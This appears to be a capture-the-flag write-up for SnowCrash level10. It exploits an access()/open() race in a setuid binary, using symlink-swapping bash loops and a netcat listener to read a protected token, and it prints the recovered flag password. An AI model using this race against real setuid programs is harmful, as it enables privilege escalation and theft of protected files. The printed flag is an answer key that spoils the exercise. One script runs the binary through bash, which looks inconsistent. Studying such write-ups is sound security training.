```shell
level10@SnowCrash:~$ cat token 
cat: token: Permission denied
level10@SnowCrash:~$ ./level10 
./level10 file host
	sends file to host if you have access to it
level10@SnowCrash:~$ ltrace ./level10 
__libc_start_main(0x80486d4, 1, 0xbffff7f4, 0x8048970, 0x80489e0 <unfinished ...>
printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
	sends file to host if you have access to it
) = 65
level10@SnowCrash:~$ echo "salut" > /tmp/test
level10@SnowCrash:~$ ./level10 /tmp/test 0.0.0.0
Connecting to 0.0.0.0:6969 .. Unable to connect to host 0.0.0.0
```

Okay, it seems like we need to provide a file for which we have the rights as a parameter and listen on port 6969. On another terminal, I do the following:

```shell
level10@SnowCrash:~$ nc -l 6969
```

Let me start over:
```shell
level10@SnowCrash:~$ ./level10 /tmp/test 0.0.0.0
Connecting to 0.0.0.0:6969 .. Connected!
```

And there you go:

```shell
level10@SnowCrash:~$ nc -l 6969
.*( )*.
salut
```

Now, it seems that we need to find a way to read the token from this executable.

Here is the execution trace of the executable using ltrace:

```shell
level10@SnowCrash:~$ ltrace ./level10 /tmp/test 0.0.0.0
__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
access("/tmp/test", 4)                                = 0
printf("Connecting to %s:6969 .. ", "0.0.0.0")        = 30
fflush(0xb7fd1a20Connecting to 0.0.0.0:6969 .. )                                    = 0
socket(2, 1, 0)                                       = 3
inet_addr("0.0.0.0")                                  = NULL
htons(6969, 1, 0, 0, 0)                               = 14619
connect(3, 0xbffff71c, 16, 0, 0)                      = 0
write(3, ".*( )*.\n", 8)                              = 8
printf("Connected!\nSending file .. "Connected!
)                = 27
fflush(0xb7fd1a20Sending file .. )                                    = 0
open("/tmp/test", 0, 010)                             = 4
read(4, "salut\n", 4096)                              = 6
write(3, "salut\n", 6)                                = 6
puts("wrote file!"wrote file!
)                                   = 12
+++ exited (status 12) +++
```

In the first function we're looking at, we immediately come across this: https://security.stackexchange.com/questions/42659/how-is-using-acces-opening-a-security-hole

The man page for access() explains this:

```
Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.
```

It appears that a race condition 'time-of-check, time-of-use' (TOCTOU) is possible.

"access() uses the real rather than effective uid and gid." https://stackoverflow.com/questions/7925177/access-security-hole


Let's test this method:

```
user executes program
program is setuid, immediately gets all privs of root
program checks file1 to ensure that user has access
file1 is a hardlink to file2, which user has access to
user changes file1 to hardlink to file3 (/etc/shadow or something like that)
program reads file1 and does something to it (print, convert, whatever)
user now has access to a file they shouldn't
```

So, I need a file for which I have read rights, like my /tmp/test for example. I will create a symbolic link from this file to /tmp/test2. The idea is to change this link between the execution of access() and open(), so that access() verifies that I have the right to open the file, and then open() can open the token.

I have created these two scripts in the `/tmp` directory:

```bash
level10@SnowCrash:/tmp$ cat exec.sh
#!/bin/bash

x=1

while [ $x -le 5000 ]
do
	bash /home/user/level10/level10 /tmp/1 0.0.0.0
	x=$(($x+1))
done
```

```bash
level10@SnowCrash:/tmp$ cat link.sh
x=1

while [ $x -le 5000 ]
        do
        ln -sf /home/user/level10/token /tmp/1
		ln -sf /tmp/2 /tmp/1
        x=$(($x+1))
done
```
exec.sh repeatedly launches the executable.
link.sh repeatedly changes the link of tmp/1 between a file for which it has the rights and the token.

There was an issue with the launch; nc only runs once, so I added -k to nc:

```
nc -lk 6969
```

Now, by running both scripts on two different terminals, I receive the password for flag10 multiple times!

```
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
salut
.*( )*.
salut
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
salut
.*( )*.
```
All that's left is to connect and use getflag.

Resources:

- https://security.stackexchange.com/questions/42659/how-is-using-acces-opening-a-security-hole
- https://vulncat.fortify.com/en/detail?id=desc.controlflow.cpp.file_access_race_condition
- https://stackoverflow.com/questions/7925177/access-security-hole
- https://samsclass.info/127/proj/E10.htm
